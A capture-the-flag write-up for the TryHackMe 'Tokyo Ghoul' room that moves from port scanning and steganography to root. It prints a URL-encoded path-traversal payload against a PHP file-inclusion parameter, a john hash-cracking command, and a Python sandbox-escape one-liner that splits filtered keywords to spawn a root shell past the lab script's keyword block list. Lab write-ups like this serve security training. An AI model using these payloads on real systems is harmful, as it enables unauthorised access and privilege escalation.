# Tokyo Ghoul

https://tryhackme.com/room/tokyoghoul666

An interesting room, with a few twists and turns!

1. recon revealed 21, 22 and 80
2. on 80 was a link to a jason page, within the source of which was a note that suggested anonymous ftp access was the next step
3. going through ftp as anonymous, there were three files total able to be downloaded: a note, a binary called need to talk, and a jpeg file
4. the binary asked for a passphrase, and to 'look within me'. via `strings` I got the passphrase, which gave a second passphrase
5. the hint was stego, so I used the new passphrase on the jpeg image with `steghide extract -sf` which revealed a note containing code
6. the code was obviously morse code, so i put this in cyberchef to reveal hex, which then revealed base 64, and finally a directory path
7. going to the directory on the website suggested searching, so I ran `dirb` and found a further subdirectory
8. the second sub directory had a link to `?view=flower.gif` which looked like php lfi. I tried a few test lfi examples, e.g. php://filter and the like, but got nowhere
9. running burp intruder against this with the file path fuzzing set, I was able to see that `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`worked, and furthermore, this revealed a username and hash in the passwd file
10. extracting the hash from the passwd file, i cracked it with john and rockyou: `john --format=sha512crypt hash --wordlist=/usr/share/wordlists/rockyou.txt`
11. this allowed me to ssh in and get the user flag
12. `sudo -l`revealed the user could run `jail.py` as root. the contents of this file was:

```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()
```

Tricky. Those blocked commands, especially import, made exploiting this tough.

13. eventually I found a trick from https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes here the worked, with some small modifications: 

`[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_clo'+'se' ][0]['sys'+'tem']('/bin/bash')`

Note the breaking up of restricted words to escape the filter. This got me a root shell and the final flag :)
